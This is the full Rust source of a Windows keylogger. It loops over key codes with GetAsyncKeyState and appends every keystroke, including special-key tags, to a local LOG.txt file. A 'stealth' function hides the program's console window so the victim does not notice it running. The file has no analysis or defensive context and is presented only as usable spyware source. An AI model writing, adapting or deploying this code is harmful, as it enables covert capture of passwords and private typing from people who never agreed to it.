extern crate winapi;
extern crate winmm;
extern crate user32;
extern crate kernel32;
use std::fs::{File, OpenOptions};
use std::io::prelude::*;
fn main() {
	stealth();
	let mut file = OpenOptions::new().append(true).open("LOG.txt").unwrap();
  loop {
  	for i in 8..190 {
    	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
    		match i as u32 {
    			32 => write!(&mut file," ").unwrap(),
    			8 => write!(&mut file,"[BackSpace]").unwrap(),
    			13 => write!(&mut file,"\n").unwrap(),
    			winapi::VK_TAB => write!(&mut file,"[TAB]").unwrap(),
    			winapi::VK_SHIFT => write!(&mut file,"[SHIFT]").unwrap(),
    			winapi::VK_CONTROL => write!(&mut file,"[CTRL]").unwrap(),
    			winapi::VK_ESCAPE => write!(&mut file,"[ESC]").unwrap(),
    			winapi::VK_END => write!(&mut file,"[END]").unwrap(),
    			winapi::VK_HOME => write!(&mut file,"[HOME]").unwrap(),
    			winapi::VK_LEFT => write!(&mut file,"[LEFT]").unwrap(),
    			winapi::VK_UP => write!(&mut file,"[UP]").unwrap(),
    			winapi::VK_RIGHT => write!(&mut file,"[RIGHT]").unwrap(),
    			winapi::VK_DOWN => write!(&mut file,"[DOWN]").unwrap(),
    			190|110 => write!(&mut file,".").unwrap(),
    			_ => write!(&mut file,"{}",i as u8 as char).unwrap()
    		};
    	}
    }
    file.flush().unwrap();
	}
}

fn stealth() {
	let mut stealth: winapi::HWND;
	unsafe {
		kernel32::AllocConsole();
		stealth = user32::FindWindowA(std::ffi::CString::new("ConsoleWindowClass").unwrap().as_ptr(), std::ptr::null());
		user32::ShowWindow(stealth,0);
	}
}
